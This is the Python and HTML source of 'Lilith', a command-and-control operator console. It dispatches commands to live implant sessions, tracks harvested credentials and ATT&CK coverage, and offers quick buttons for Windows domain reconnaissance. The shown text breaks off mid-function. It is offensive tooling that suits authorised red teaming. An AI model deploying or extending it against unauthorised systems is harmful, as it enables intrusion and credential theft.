"""
server/ui.py — Lilith engagement console (Caldera-style SPA).

Endpoints:
  GET  /ui/                              → HTML SPA
  GET  /ui/api/summary                   → aggregate stats + recent events
  GET  /ui/api/sessions                  → DB session list
  GET  /ui/api/session/<id>              → session detail (tasks+results)
  GET  /ui/api/credentials               → credential findings
  GET  /ui/api/techniques                → ATT&CK coverage
  GET  /ui/api/events                    → full event log
  GET  /ui/api/export/json               → full JSON dump
  GET  /ui/api/export/markdown           → Markdown engagement report
  POST /ui/api/sessions/<id>/label       → set label/note on session
  GET  /ui/api/c2/sessions              → live C2 session registry (in-memory)
  POST /ui/api/c2/<sid>/task            → dispatch command → {task_id}
  GET  /ui/api/c2/<sid>/result/<tid>    → 200+output | 204 pending | 404 gone
  DELETE /ui/api/c2/<sid>              → kill session → {ok}
  GET  /ui/api/arsenal                  → workspace file listing
"""

import json
import os
import re

# ── Workspace path (set at server startup) ───────────────────────────────────

_workspace = ""

def set_workspace(path: str) -> None:
    global _workspace
    _workspace = path


# ── Lazy import to avoid circular dependency with https_server ───────────────

def _srv():
    import server.https_server as m
    return m


# ── ATT&CK metadata ───────────────────────────────────────────────────────────

TACTIC_ORDER = [
    "Execution", "Persistence", "Privilege Escalation", "Defense Evasion",
    "Credential Access", "Discovery", "Lateral Movement",
    "Collection", "Command and Control", "Exfiltration",
]

TECH_META: dict[str, dict] = {
    "T1059.001": {"name": "PowerShell",            "tactic": "Execution"},
    "T1059.003": {"name": "Windows Cmd Shell",     "tactic": "Execution"},
    "T1546.003": {"name": "WMI Event Sub",         "tactic": "Persistence"},
    "T1546.015": {"name": "COM Hijacking",         "tactic": "Persistence"},
    "T1547.001": {"name": "Registry Run Key",      "tactic": "Persistence"},
    "T1053.005": {"name": "Scheduled Task",        "tactic": "Persistence"},
    "T1068":     {"name": "Exploit for PE",        "tactic": "Privilege Escalation"},
    "T1134":     {"name": "Token Manipulation",    "tactic": "Privilege Escalation"},
    "T1134.001": {"name": "SeImpersonate Abuse",   "tactic": "Privilege Escalation"},
    "T1055":     {"name": "Process Injection",     "tactic": "Defense Evasion"},
    "T1055.015": {"name": "Inject (ListPlanting)", "tactic": "Defense Evasion"},
    "T1003":     {"name": "Credential Dumping",    "tactic": "Credential Access"},
    "T1558":     {"name": "Kerberos Tickets",      "tactic": "Credential Access"},
    "T1649":     {"name": "Shadow Credentials",    "tactic": "Credential Access"},
    "T1555":     {"name": "Password Stores",       "tactic": "Credential Access"},
    "T1555.003": {"name": "Chrome Creds",          "tactic": "Credential Access"},
    "T1033":     {"name": "User Discovery",        "tactic": "Discovery"},
    "T1082":     {"name": "System Info",           "tactic": "Discovery"},
    "T1087":     {"name": "Account Discovery",     "tactic": "Discovery"},
    "T1087.002": {"name": "Domain Accounts",       "tactic": "Discovery"},
    "T1069.001": {"name": "Local Groups",          "tactic": "Discovery"},
    "T1069.002": {"name": "Domain Groups",         "tactic": "Discovery"},
    "T1016":     {"name": "Network Config",        "tactic": "Discovery"},
    "T1057":     {"name": "Process Discovery",     "tactic": "Discovery"},
    "T1049":     {"name": "Network Connections",   "tactic": "Discovery"},
    "T1083":     {"name": "File Discovery",        "tactic": "Discovery"},
    "T1012":     {"name": "Query Registry",        "tactic": "Discovery"},
    "T1018":     {"name": "Remote Sys Discovery",  "tactic": "Discovery"},
    "T1482":     {"name": "Domain Trust",          "tactic": "Discovery"},
    "T1021":     {"name": "Remote Services",       "tactic": "Lateral Movement"},
    "T1090":     {"name": "Proxy",                 "tactic": "Lateral Movement"},
    "T1090.003": {"name": "Multi-hop Proxy",       "tactic": "Lateral Movement"},
    "T1113":     {"name": "Screen Capture",        "tactic": "Collection"},
    "T1041":     {"name": "Exfil over C2",         "tactic": "Exfiltration"},
    "T1105":     {"name": "Ingress Tool Transfer", "tactic": "Command and Control"},
}


# ── API helpers ───────────────────────────────────────────────────────────────

def _j(data, status: int = 200) -> tuple:
    return status, "application/json", json.dumps(data, default=str).encode()


def _api_summary(db) -> dict:
    sessions = db.get_sessions()
    tasks    = db.get_tasks()
    events   = db.get_events()
    creds    = db.get_cred_results()

    covered: dict[str, int] = {}
    for t in tasks:
        tid = t.get("technique_id") or ""
        if tid:
            covered[tid] = covered.get(tid, 0) + 1

    top = sorted(covered.items(), key=lambda x: -x[1])[:5]
    top_tech = [{"tid": k, "count": v,
                 "name": TECH_META.get(k, {}).get("name", k)} for k, v in top]

    recent = sorted(events, key=lambda e: e.get("at", ""))[-15:][::-1]

    return {
        "session_count":           len(sessions),
        "task_count":              len(tasks),
        "cred_count":              len(creds),
        "event_count":             len(events),
        "covered_technique_count": len(covered),
        "total_technique_count":   len(TECH_META),
        "top_techniques":          top_tech,
        "recent_events":           recent,
    }


def _api_session(db, session_id: str) -> dict:
    sessions = [s for s in db.get_sessions() if s["id"] == session_id]
    if not sessions:
        return {}
    tasks   = db.get_tasks(session_id)
    results = db.get_results_for_session(session_id)
    events  = db.get_events(session_id)
    rmap    = {r["task_id"]: r for r in results}
    for t in tasks:
        r = rmap.get(t["id"]) or {}
        t["output"]    = r.get("output")
        t["has_creds"] = r.get("has_creds", 0)
        hints = r.get("cred_hints")
        try:
            t["cred_hints"] = json.loads(hints) if hints else []
        except Exception:
            t["cred_hints"] = []
    return {"session": sessions[0], "tasks": tasks, "events": events}


def _api_credentials(db) -> list:
    rows = db.get_cred_results()
    for r in rows:
        hints = r.get("cred_hints")
        try:
            r["cred_hints"] = json.loads(hints) if hints else []
        except Exception:
            r["cred_hints"] = []
    return rows


def _api_techniques(db) -> dict:
    tasks = db.get_tasks()
    covered: dict[str, list] = {}
    for t in tasks:
        tid = t.get("technique_id") or ""
        sid = t.get("session_id") or ""
        if tid:
            if tid not in covered:
                covered[tid] = []
            if sid and sid not in covered[tid]:
                covered[tid].append(sid)
    return {
        "all_techniques": TECH_META,
        "tactic_order":   TACTIC_ORDER,
        "covered":        covered,
    }


def _label_session(db, session_id: str, body: bytes) -> dict:
    try:
        data = json.loads(body or b"{}")
    except Exception:
        data = {}
    label = str(data.get("label", "")).strip()[:64]
    note  = str(data.get("note",  "")).strip()[:512]
    ok = db.tag_session(session_id, label, note or None)
    return {"ok": ok}


# ── Live C2 API (calls into https_server in-process) ─────────────────────────

def _api_c2_sessions() -> dict:
    return _srv().get_c2_sessions()


def _api_c2_task(session_id: str, body: bytes) -> tuple:
    try:
        cmd = json.loads(body or b"{}").get("cmd", "").strip()
    except Exception:
        cmd = ""
    if not cmd:
        return _j({"error": "empty command"}, 400)
    task_id = _srv()._c2_push_task(session_id, cmd)
    if task_id is None:
        return _j({"error": "session not found"}, 404)
    return _j({"task_id": task_id})


def _api_c2_result(session_id: str, task_id: str) -> tuple:
    output = _srv()._c2_get_result(session_id, task_id)
    if output is None:
        return 204, "application/json", b""
    return 200, "text/plain; charset=utf-8", output.encode()


def _api_c2_kill(session_id: str) -> tuple:
    ok = _srv()._c2_kill_session(session_id)
    return _j({"ok": ok})


def _api_arsenal() -> dict:
    if not _workspace or not os.path.isdir(_workspace):
        return {"workspace": _workspace, "files": []}
    files = []
    for fname in sorted(os.listdir(_workspace)):
        fpath = os.path.join(_workspace, fname)
        if os.path.isfile(fpath):
            size = os.path.getsize(fpath)
            ext  = os.path.splitext(fname)[1].lower()
            files.append({"name": fname, "size": size, "ext": ext})
    return {"workspace": _workspace, "files": files}


# ── Router ────────────────────────────────────────────────────────────────────

def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
    """Route /ui/* → (status_code, content_type, body_bytes)."""
    path = path.split("?")[0]

    if method == "GET":
        if path in ("/ui", "/ui/"):
            return 200, "text/html; charset=utf-8", _UI_HTML.encode()
        if path == "/ui/api/summary":
            return _j(_api_summary(db))
        if path == "/ui/api/sessions":
            return _j(db.get_sessions())
        m = re.fullmatch(r"/ui/api/session/([^/]+)", path)
        if m:
            return _j(_api_session(db, m.group(1)))
        if path == "/ui/api/credentials":
            return _j(_api_credentials(db))
        if path == "/ui/api/techniques":
            return _j(_api_techniques(db))
        if path == "/ui/api/events":
            return _j(db.get_events())
        if path == "/ui/api/export/json":
            raw = json.dumps(db.export_json(), indent=2, default=str).encode()
            return 200, "application/json", raw
        if path == "/ui/api/export/markdown":
            md = db.export_markdown()
            return 200, "text/markdown; charset=utf-8", md.encode()
        if path == "/ui/api/c2/sessions":
            return _j(_api_c2_sessions())
        m = re.fullmatch(r"/ui/api/c2/([^/]+)/result/([^/]+)", path)
        if m:
            return _api_c2_result(m.group(1), m.group(2))
        if path == "/ui/api/arsenal":
            return _j(_api_arsenal())

    if method == "POST":
        m = re.fullmatch(r"/ui/api/sessions/([^/]+)/label", path)
        if m:
            return _j(_label_session(db, m.group(1), body))
        m = re.fullmatch(r"/ui/api/c2/([^/]+)/task", path)
        if m:
            return _api_c2_task(m.group(1), body)

    if method == "DELETE":
        m = re.fullmatch(r"/ui/api/c2/([^/]+)", path)
        if m:
            return _api_c2_kill(m.group(1))

    return 404, "application/json", b'{"error":"not found"}'


# ── HTML SPA ──────────────────────────────────────────────────────────────────

_UI_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>LILITH // C2</title>
<style>
:root {
  --bg:     #060606;
  --surf:   #0d0d0d;
  --surf2:  #111111;
  --surf3:  #181818;
  --border: #1a1a1a;
  --bord2:  #252525;
  --red:    #c81e1e;
  --red2:   #ef4444;
  --red3:   rgba(200,30,30,.15);
  --red4:   rgba(200,30,30,.06);
  --text:   #cccccc;
  --muted:  #3d3d3d;
  --muted2: #666666;
  --green:  #16a34a;
  --yellow: #ca8a04;
  --mono:   'Cascadia Code','Consolas','JetBrains Mono',monospace;
  --sw:     210px;
}
*,*::before,*::after { box-sizing:border-box; margin:0; padding:0; }
html,body { height:100%; background:var(--bg); color:var(--text); font:13px/1.5 var(--mono); }
a { color:var(--red2); text-decoration:none; }

/* ── layout ── */
#app { display:flex; height:100vh; overflow:hidden; }
#sidebar {
  width:var(--sw); min-width:var(--sw); background:var(--surf);
  border-right:1px solid var(--border); display:flex; flex-direction:column;
  padding:0; overflow:hidden;
}
#main { flex:1; overflow:hidden; display:flex; flex-direction:column; }
#topbar {
  height:36px; background:var(--surf); border-bottom:1px solid var(--border);
  display:flex; align-items:center; padding:0 16px; gap:8px; flex-shrink:0;
  font-size:11px; color:var(--muted2);
}
#content { flex:1; overflow:auto; padding:0; }

/* ── sidebar ── */
.logo {
  padding:16px 16px 12px;
  font-size:14px; font-weight:700; letter-spacing:.1em;
  color:var(--red); border-bottom:1px solid var(--border);
}
.logo span { color:var(--muted2); font-weight:400; }
nav { display:flex; flex-direction:column; padding:8px 0; flex:1; }
.nav-item {
  display:flex; align-items:center; gap:9px;
  padding:7px 16px; cursor:pointer;
  font-size:12px; color:var(--muted2); letter-spacing:.05em;
  border-left:2px solid transparent; transition:all .12s;
  user-select:none;
}
.nav-item:hover { color:var(--text); background:var(--surf3); }
.nav-item.active { color:var(--red2); border-left-color:var(--red); background:var(--red4); }
.nav-icon { width:14px; text-align:center; font-size:11px; }
.nav-footer {
  padding:12px 16px; font-size:10px; color:var(--muted);
  border-top:1px solid var(--border);
}

/* ── page sections ── */
.view { display:none; height:100%; }
.view.active { display:flex; flex-direction:column; height:100%; }
.view-header {
  padding:18px 24px 14px; border-bottom:1px solid var(--border);
  display:flex; align-items:center; justify-content:space-between; flex-shrink:0;
}
.view-title { font-size:11px; letter-spacing:.15em; color:var(--muted2); }
.view-title strong { color:var(--red2); font-size:14px; display:block; margin-top:2px; letter-spacing:.05em; }
.view-body { flex:1; overflow:auto; padding:20px 24px; }

/* ── stat cards ── */
.stat-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(160px,1fr)); gap:10px; margin-bottom:20px; }
.stat-card {
  background:var(--surf2); border:1px solid var(--border); border-radius:4px;
  padding:14px 16px;
}
.stat-label { font-size:10px; color:var(--muted2); letter-spacing:.1em; margin-bottom:4px; }
.stat-value { font-size:26px; font-weight:700; color:var(--red2); }
.stat-sub   { font-size:10px; color:var(--muted2); margin-top:2px; }

/* ── tables ── */
.tbl-wrap { overflow-x:auto; }
table { width:100%; border-collapse:collapse; font-size:12px; }
th { text-align:left; padding:7px 12px; font-size:10px; letter-spacing:.1em;
     color:var(--muted2); border-bottom:1px solid var(--bord2); white-space:nowrap; }
td { padding:8px 12px; border-bottom:1px solid var(--border); vertical-align:top; word-break:break-all; }
tr:hover td { background:var(--surf3); }
.mono { font-family:var(--mono); }
.truncate { max-width:220px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }

/* ── badges ── */
.badge {
  display:inline-block; padding:2px 7px; border-radius:2px; font-size:10px;
  letter-spacing:.05em; font-weight:600;
}
.badge-alive  { background:rgba(22,163,74,.2);  color:#4ade80; }
.badge-stale  { background:rgba(202,138,4,.2);  color:#fbbf24; }
.badge-dead   { background:rgba(100,100,100,.2); color:#6b7280; }
.badge-red    { background:var(--red3); color:var(--red2); }

/* ── buttons ── */
.btn {
  display:inline-flex; align-items:center; gap:5px;
  padding:5px 12px; border:1px solid var(--bord2); border-radius:3px;
  background:var(--surf3); color:var(--text); font:12px var(--mono);
  cursor:pointer; transition:all .1s; white-space:nowrap;
}
.btn:hover { border-color:var(--muted2); background:var(--surf2); }
.btn-red  { border-color:var(--red); color:var(--red2); }
.btn-red:hover { background:var(--red3); }
.btn-sm   { padding:3px 8px; font-size:11px; }
.btn-ghost { background:transparent; border-color:transparent; color:var(--muted2); }
.btn-ghost:hover { color:var(--text); border-color:var(--bord2); }

/* ── event log ── */
.ev-list { display:flex; flex-direction:column; gap:3px; }
.ev-row {
  display:flex; gap:10px; padding:5px 10px; border-radius:3px;
  font-size:11px; background:var(--surf2); border:1px solid var(--border);
}
.ev-ts   { color:var(--muted2); white-space:nowrap; flex-shrink:0; }
.ev-type { color:var(--red2); width:100px; flex-shrink:0; }
.ev-msg  { color:var(--text); }

/* ── ATT&CK grid ── */
.atk-grid { display:flex; gap:12px; flex-wrap:wrap; }
.atk-col  { flex:1; min-width:160px; }
.atk-tactic {
  font-size:10px; letter-spacing:.1em; color:var(--muted2);
  padding:6px 0 4px; border-bottom:1px solid var(--border); margin-bottom:6px;
}
.atk-tech {
  padding:5px 8px; margin-bottom:3px; border-radius:3px; font-size:11px;
  border:1px solid var(--border); background:var(--surf2); cursor:default;
}
.atk-tech.covered {
  background:var(--red3); border-color:var(--red); color:var(--red2);
}
.atk-tid { font-size:9px; color:var(--muted2); display:block; margin-top:1px; }

/* ═══════════════════════════════════════════════════════
   C2 SHELL VIEW
   ═══════════════════════════════════════════════════════ */
#view-shell { background:var(--bg); }
#shell-topbar {
  display:flex; align-items:center; gap:12px; flex-wrap:wrap;
  padding:10px 16px; background:var(--surf); border-bottom:1px solid var(--border);
  flex-shrink:0;
}
#shell-sess-select {
  background:var(--surf3); border:1px solid var(--bord2); color:var(--text);
  font:12px var(--mono); padding:4px 8px; border-radius:3px; min-width:220px;
}
#shell-sess-select:focus { outline:none; border-color:var(--red); }
#shell-info {
  flex:1; display:flex; align-items:center; gap:10px; font-size:11px;
}
#shell-host  { color:var(--text); }
#shell-ip    { color:var(--muted2); }
#shell-status { }
#shell-actions { display:flex; gap:6px; margin-left:auto; }

.quick-bar {
  padding:8px 16px; background:var(--surf2); border-bottom:1px solid var(--border);
  display:flex; gap:5px; flex-wrap:wrap; align-items:center; flex-shrink:0;
}
.quick-label { font-size:10px; color:var(--muted2); letter-spacing:.08em; margin-right:4px; }
.qbtn {
  padding:3px 8px; font-size:10px; border:1px solid var(--bord2); border-radius:2px;
  background:var(--surf3); color:var(--muted2); cursor:pointer; font-family:var(--mono);
  transition:all .1s; white-space:nowrap;
}
.qbtn:hover { border-color:var(--red); color:var(--red2); background:var(--red4); }

#shell-out {
  flex:1; overflow-y:auto; padding:12px 16px;
  font:13px/1.6 var(--mono); background:var(--bg);
}
.sl { margin:1px 0; }
.sl-prompt  { color:var(--red); }
.sl-cmd     { color:#e5e7eb; }
.sl-output  { color:#9ca3af; white-space:pre-wrap; word-break:break-all; }
.sl-err     { color:#f87171; }
.sl-info    { color:var(--muted2); font-style:italic; }
.sl-pending { color:var(--yellow); }
.blink { animation:blink .9s step-end infinite; }
@keyframes blink { 50%{opacity:0} }

#shell-input-bar {
  display:flex; gap:8px; align-items:center;
  padding:10px 16px; background:var(--surf); border-top:1px solid var(--border);
  flex-shrink:0;
}
#shell-prompt-label { color:var(--red); font-size:12px; flex-shrink:0; }
#shell-input {
  flex:1; background:transparent; border:none; outline:none;
  color:var(--text); font:13px var(--mono); caret-color:var(--red2);
}
#shell-input::placeholder { color:var(--muted); }

/* ═══════════════════════════════════════════════════════
   ARSENAL VIEW
   ═══════════════════════════════════════════════════════ */
.arsenal-cat { font-size:10px; letter-spacing:.12em; color:var(--muted2); margin-bottom:6px; padding-top:16px; }
.arsenal-cat:first-child { padding-top:0; }
.file-row {
  display:flex; align-items:center; gap:12px;
  padding:8px 12px; background:var(--surf2); border:1px solid var(--border);
  border-radius:3px; margin-bottom:4px; font-size:12px;
}
.file-name { flex:1; color:var(--text); font-family:var(--mono); }
.file-size { color:var(--muted2); font-size:11px; flex-shrink:0; width:70px; text-align:right; }
.file-ext  { color:var(--red2); font-size:10px; width:36px; text-align:center;
             background:var(--red4); border:1px solid var(--red3); border-radius:2px; padding:1px 4px; }
.copy-btn {
  padding:3px 8px; font-size:10px; border:1px solid var(--bord2); border-radius:2px;
  background:var(--surf3); color:var(--muted2); cursor:pointer; font-family:var(--mono);
  transition:all .1s; flex-shrink:0;
}
.copy-btn:hover { border-color:var(--red); color:var(--red2); }
.copy-btn.copied { border-color:var(--green); color:#4ade80; }

/* ── credential cards ── */
.cred-row td:first-child { font-family:var(--mono); color:var(--red2); }
.hint-list { margin-top:4px; display:flex; flex-direction:column; gap:2px; }
.hint { font-size:11px; color:var(--muted2); }
.hint strong { color:var(--text); }

/* ── section card ── */
.section { margin-bottom:20px; }
.section-hdr {
  font-size:10px; letter-spacing:.12em; color:var(--muted2);
  padding-bottom:8px; border-bottom:1px solid var(--border); margin-bottom:12px;
}

/* ── scrollbar ── */
::-webkit-scrollbar { width:5px; height:5px; }
::-webkit-scrollbar-track { background:var(--bg); }
::-webkit-scrollbar-thumb { background:var(--bord2); border-radius:4px; }
::-webkit-scrollbar-thumb:hover { background:var(--muted); }

/* ── live dot ── */
.dot { display:inline-block; width:7px; height:7px; border-radius:50%; margin-right:4px; }
.dot-green  { background:#4ade80; box-shadow:0 0 5px #4ade80; }
.dot-yellow { background:#fbbf24; box-shadow:0 0 5px #fbbf24; }
.dot-gray   { background:#4b5563; }
</style>
</head>
<body>
<div id="app">

<!-- ── Sidebar ── -->
<div id="sidebar">
  <div class="logo">LILITH <span>// C2</span></div>
  <nav>
    <div class="nav-item active" data-view="dash">
      <span class="nav-icon">▤</span> DASHBOARD
    </div>
    <div class="nav-item" data-view="shell">
      <span class="nav-icon">⌨</span> C2 SHELL
    </div>
    <div class="nav-item" data-view="sessions">
      <span class="nav-icon">◈</span> SESSIONS
    </div>
    <div class="nav-item" data-view="arsenal">
      <span class="nav-icon">⊡</span> ARSENAL
    </div>
    <div class="nav-item" data-view="creds">
      <span class="nav-icon">⚷</span> CREDENTIALS
    </div>
    <div class="nav-item" data-view="attack">
      <span class="nav-icon">⊗</span> ATT&amp;CK
    </div>
    <div class="nav-item" data-view="report">
      <span class="nav-icon">⊞</span> REPORT
    </div>
  </nav>
  <div class="nav-footer" id="live-badge">
    <span id="live-count">— sessions live</span>
  </div>
</div>

<!-- ── Main ── -->
<div id="main">
  <div id="topbar">
    <span style="color:var(--red2);font-weight:700">LILITH</span>
    <span>//</span>
    <span id="topbar-host" style="color:var(--text)">loading...</span>
    <span style="margin-left:auto" id="topbar-ts"></span>
  </div>
  <div id="content">

    <!-- ══ DASHBOARD ══ -->
    <div class="view active" id="view-dash">
      <div class="view-header">
        <div class="view-title"><span>ENGAGEMENT</span><strong>Dashboard</strong></div>
        <button class="btn btn-sm" onclick="refreshAll()">↺ Refresh</button>
      </div>
      <div class="view-body">
        <div class="stat-grid" id="dash-stats"></div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
          <div class="section">
            <div class="section-hdr">LIVE SESSIONS</div>
            <div id="dash-live"></div>
          </div>
          <div class="section">
            <div class="section-hdr">RECENT EVENTS</div>
            <div class="ev-list" id="dash-events"></div>
          </div>
        </div>
      </div>
    </div>

    <!-- ══ C2 SHELL ══ -->
    <div class="view" id="view-shell">
      <div id="shell-topbar">
        <select id="shell-sess-select" onchange="shellSelectSession(this.value)">
          <option value="">— select session —</option>
        </select>
        <div id="shell-info">
          <span id="shell-host" style="display:none"></span>
          <span id="shell-ip" style="display:none"></span>
          <span id="shell-status"></span>
        </div>
        <div id="shell-actions">
          <button class="btn btn-sm" onclick="shellClear()">CLEAR</button>
          <button class="btn btn-sm btn-red" id="btn-kill" onclick="shellKill()" style="display:none">KILL</button>
        </div>
      </div>
      <div class="quick-bar">
        <span class="quick-label">QUICK▸</span>
        <button class="qbtn" onclick="shellQuick('whoami /all')">whoami /all</button>
        <button class="qbtn" onclick="shellQuick('hostname')">hostname</button>
        <button class="qbtn" onclick="shellQuick('ipconfig /all')">ipconfig /all</button>
        <button class="qbtn" onclick="shellQuick('net user /domain')">net user /dom</button>
        <button class="qbtn" onclick="shellQuick('net group \"Domain Admins\" /domain')">dom admins</button>
        <button class="qbtn" onclick="shellQuick('nltest /domain_trusts')">dom trusts</button>
        <button class="qbtn" onclick="shellQuick('arp -a')">arp -a</button>
        <button class="qbtn" onclick="shellQuick('tasklist /v')">tasklist</button>
        <button class="qbtn" onclick="shellQuick('net share')">net share</button>
        <button class="qbtn" onclick="shellQuick('netstat -ano')">netstat</button>
        <button class="qbtn" onclick="shellQuick('reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v NullSessionPipes')">null sess</button>
        <button class="qbtn" onclick="shellQuick('wmic os get Caption,Version,OSArchitecture /format:list')">os info</button>
      </div>
      <div id="shell-out"></div>
      <div id="shell-input-bar">
        <span id="shell-prompt-label">C2&gt;</span>
        <input id="shell-input" type="text" placeholder="enter command..."
               onkeydown="shellKeydown(event)" autocomplete="off" spellcheck="false">
        <button class="btn btn-red" onclick="shellSend()">EXECUTE</button>
      </div>
    </div>

    <!-- ══ SESSIONS ══ -->
    <div class="view" id="view-sessions">
      <div class="view-header">
        <div class="view-title"><span>TARGETS</span><strong>Sessions</strong></div>
      </div>
      <div class="view-body">
        <div class="tbl-wrap">
          <table id="sess-table">
            <thead>
              <tr>
                <th>ID</th><th>HOST / IP</th><th>LABEL</th>
                <th>STATUS</th><th>LAST SEEN</th><th>QUEUED</th><th>ACTIONS</th>
              </tr>
            </thead>
            <tbody id="sess-tbody"></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- ══ ARSENAL ══ -->
    <div class="view" id="view-arsenal">
      <div class="view-header">
        <div class="view-title"><span>WORKSPACE</span><strong>Arsenal</strong></div>
        <button class="btn btn-sm" onclick="loadArsenal()">↺ Refresh</button>
      </div>
      <div class="view-body">
        <div id="arsenal-ws" style="font-size:11px;color:var(--muted2);margin-bottom:16px"></div>
        <div id="arsenal-body"></div>
      </div>
    </div>

    <!-- ══ CREDENTIALS ══ -->
    <div class="view" id="view-creds">
      <div class="view-header">
        <div class="view-title"><span>FINDINGS</span><strong>Credentials</strong></div>
      </div>
      <div class="view-body">
        <div class="tbl-wrap">
          <table>
            <thead>
              <tr><th>SESSION</th><th>TOOL</th><th>CAPTURED AT</th><th>DETAILS</th></tr>
            </thead>
            <tbody id="creds-tbody"></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- ══ ATT&CK ══ -->
    <div class="view" id="view-attack">
      <div class="view-header">
        <div class="view-title"><span>MITRE</span><strong>ATT&amp;CK Coverage</strong></div>
      </div>
      <div class="view-body">
        <div class="stat-grid" style="margin-bottom:20px">
          <div class="stat-card">
            <div class="stat-label">COVERED</div>
            <div class="stat-value" id="atk-cov">—</div>
            <div class="stat-sub">of <span id="atk-tot">—</span> tracked techniques</div>
          </div>
        </div>
        <div class="atk-grid" id="atk-grid"></div>
      </div>
    </div>

    <!-- ══ REPORT ══ -->
    <div class="view" id="view-report">
      <div class="view-header">
        <div class="view-title"><span>EXPORT</span><strong>Report</strong></div>
      </div>
      <div class="view-body">
        <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:24px">
          <a class="btn" href="/ui/api/export/json" download="lilith_engagement.json">
            ↓ JSON Export
          </a>
          <a class="btn" href="/ui/api/export/markdown" download="lilith_engagement.md">
            ↓ Markdown Report
          </a>
        </div>
        <div class="section">
          <div class="section-hdr">SESSION LABEL EDITOR</div>
          <div id="label-editor"></div>
        </div>
      </div>
    </div>

  </div><!-- #content -->
</div><!-- #main -->
</div><!-- #app -->

<script>
// ── state ─────────────────────────────────────────────────────────────────────
let liveSessions = {};
let dbSessions   = [];
let shellSid     = null;
let shellHistory = [];
let histIdx      = -1;
let pendingPoll  = null;   // {interval, task_id}

// ── navigation ────────────────────────────────────────────────────────────────
document.querySelectorAll('.nav-item').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    el.classList.add('active');
    const v = document.getElementById('view-' + el.dataset.view);
    if (v) v.classList.add('active');
    if (el.dataset.view === 'arsenal') loadArsenal();
    if (el.dataset.view === 'sessions') renderSessions();
    if (el.dataset.view === 'attack') loadAttack();
    if (el.dataset.view === 'creds')  loadCreds();
    if (el.dataset.view === 'report') loadReport();
  });
});

// ── clock ─────────────────────────────────────────────────────────────────────
function tick() {
  const now = new Date();
  document.getElementById('topbar-ts').textContent =
    now.toISOString().replace('T',' ').slice(0,19) + ' UTC';
}
tick(); setInterval(tick, 1000);

// ── utils ─────────────────────────────────────────────────────────────────────
function fmt_size(b) {
  if (b < 1024) return b + ' B';
  if (b < 1024*1024) return (b/1024).toFixed(1) + ' KB';
  return (b/1024/1024).toFixed(2) + ' MB';
}

function esc(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

// ── live sessions fetch ───────────────────────────────────────────────────────
async function fetchLive() {
  try {
    const r = await fetch('/ui/api/c2/sessions');
    if (r.ok) {
      liveSessions = await r.json();
      const cnt = Object.keys(liveSessions).length;
      const alive = Object.values(liveSessions).filter(s=>!s.stale).length;
      document.getElementById('live-count').textContent =
        cnt + ' live  (' + alive + ' alive)';
      updateShellSelector();
      updateDashLive();
    }
  } catch(e) {}
}

async function fetchDB() {
  try {
    const r = await fetch('/ui/api/summary');
    if (r.ok) {
      const d = await r.json();
      renderDashStats(d);
      renderDashEvents(d.recent_events || []);
    }
    const r2 = await fetch('/ui/api/sessions');
    if (r2.ok) dbSessions = await r2.json();
  } catch(e) {}
}

async function refreshAll() {
  await Promise.all([fetchLive(), fetchDB()]);
  const active = document.querySelector('.nav-item.active');
  if (active) {
    const v = active.dataset.view;
    if (v === 'sessions') renderSessions();
  }
}

// ── dashboard ─────────────────────────────────────────────────────────────────
function renderDashStats(d) {
  const host = window.location.hostname;
  document.getElementById('topbar-host').textContent = host + ':' + window.location.port;

  const grid = document.getElementById('dash-stats');
  const liveCnt = Object.keys(liveSessions).length;
  const aliveCnt = Object.values(liveSessions).filter(s=>!s.stale).length;
  grid.innerHTML = [
    {label:'LIVE SESSIONS', val: aliveCnt + ' / ' + liveCnt, sub:'in registry'},
    {label:'DB SESSIONS',   val: d.session_count, sub:'total registered'},
    {label:'TASKS EXEC',    val: d.task_count,    sub:'commands sent'},
    {label:'CREDENTIALS',   val: d.cred_count,    sub:'findings'},
    {label:'ATT&CK',        val: d.covered_technique_count + ' / ' + d.total_technique_count, sub:'techniques covered'},
    {label:'EVENTS',        val: d.event_count,   sub:'in log'},
  ].map(c => `
    <div class="stat-card">
      <div class="stat-label">${c.label}</div>
      <div class="stat-value">${esc(String(c.val))}</div>
      <div class="stat-sub">${c.sub}</div>
    </div>`).join('');
}

function updateDashLive() {
  const el = document.getElementById('dash-live');
  const sids = Object.keys(liveSessions);
  if (!sids.length) {
    el.innerHTML = '<div style="color:var(--muted2);font-size:12px">No active sessions</div>';
    return;
  }
  el.innerHTML = sids.map(sid => {
    const s = liveSessions[sid];
    const dotCls = s.stale ? 'dot-yellow' : 'dot-green';
    const badgeCls = s.stale ? 'badge-stale' : 'badge-alive';
    const badgeTxt = s.stale ? 'STALE' : 'ALIVE';
    return `<div class="file-row" style="margin-bottom:4px;cursor:pointer" onclick="goShell('${esc(sid)}')">
      <span class="dot ${dotCls}"></span>
      <span class="file-name">${esc(sid.slice(0,16))}</span>
      <span class="file-size" style="color:var(--muted2)">${esc(s.host)}</span>
      <span class="badge ${badgeCls}">${badgeTxt}</span>
      <span style="font-size:10px;color:var(--muted2)">${esc(s.last_seen)}</span>
    </div>`;
  }).join('');
}

function renderDashEvents(events) {
  const el = document.getElementById('dash-events');
  if (!events.length) {
    el.innerHTML = '<div style="color:var(--muted2);font-size:12px">No events</div>';
    return;
  }
  el.innerHTML = events.slice(0,12).map(e =>
    `<div class="ev-row">
      <span class="ev-ts">${esc((e.at||'').slice(11,19))}</span>
      <span class="ev-type">${esc(e.type||'')}</span>
      <span class="ev-msg">${esc(e.message||'')}</span>
    </div>`
  ).join('');
}

function goShell(sid) {
  document.querySelector('[data-view="shell"]').click();
  document.getElementById('shell-sess-select').value = sid;
  shellSelectSession(sid);
}

// ── C2 Shell ──────────────────────────────────────────────────────────────────
function updateShellSelector() {
  const sel = document.getElementById('shell-sess-select');
  const cur = sel.value;
  const sids = Object.keys(liveSessions);
